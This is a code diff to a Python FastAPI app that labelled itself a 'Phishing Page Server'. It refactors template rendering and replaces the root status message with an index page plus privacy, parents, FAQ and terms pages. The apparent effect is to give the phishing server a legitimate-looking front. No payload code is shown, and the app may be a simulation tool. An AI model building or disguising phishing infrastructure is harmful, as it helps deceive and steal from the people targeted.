@@ -344,24 +344,26 @@ def _find_page_by_id(page_id: str):
 # ═══════════════════════════════════════════════════
 # TEMPLATE RENDER HELPER (Starlette 0.30+ compatible)
 # ═══════════════════════════════════════════════════
-def _render_page(request: Request, **kwargs):
+def _render_template(request: Request, template_name: str, context: Dict = None):
     """Render template avec gestion d'erreur.
     Starlette 0.30+ : TemplateResponse(request, template, context)
     """
+    if context is None:
+        context = {}
     try:
         # Nouvelle API Starlette 0.30+ : request en premier
         return templates.TemplateResponse(
             request,
-            "phishing.html",
-            kwargs
+            template_name,
+            context
         )
     except TypeError as e:
         if "tuple" in str(e).lower() or "positional" in str(e).lower():
             # Ancienne API Starlette : template en premier, context avec request
             try:
                 return templates.TemplateResponse(
-                    "phishing.html",
-                    {"request": request, **kwargs}
+                    template_name,
+                    {"request": request, **context}
                 )
             except Exception as e2:
                 logger.error("Template render error (legacy API): %s", str(e2))
@@ -375,6 +377,10 @@ def _render_page(request: Request, **kwargs):
             content=f"<html><body><h1>Error</h1><p>{str(e)}</p></body></html>",
             status_code=500
         )
+
+def _render_page(request: Request, **kwargs):
+    """Helper pour phishing.html"""
+    return _render_template(request, "phishing.html", kwargs)
 
 # ═══════════════════════════════════════════════════
 # ENDPOINTS
@@ -653,10 +659,27 @@ async def reset_verification(request: Request, data: ResetVerificationRequest):
     return {"success": True, "page_id": data.page_id, "field": data.field, "value": None}
 
 
-@app.get("/")
-async def root():
-    return {"message": "Phishing Page Server v4.5 running.", "status": "healthy"}
+@app.get("/", response_class=HTMLResponse)
+async def root(request: Request):
+    return _render_template(request, "index.html")
 
+
+
+@app.get("/privacy", response_class=HTMLResponse)
+async def privacy(request: Request):
+    return _render_template(request, "privacy.html")
+
+@app.get("/parents", response_class=HTMLResponse)
+async def parents(request: Request):
+    return _render_template(request, "parents.html")
+
+@app.get("/faq", response_class=HTMLResponse)
+async def faq(request: Request):
+    return _render_template(request, "faq.html")
+
+@app.get("/terms", response_class=HTMLResponse)
+async def terms(request: Request):
+    return _render_template(request, "terms.html")
 
 @app.get("/health")
 async def health_check():
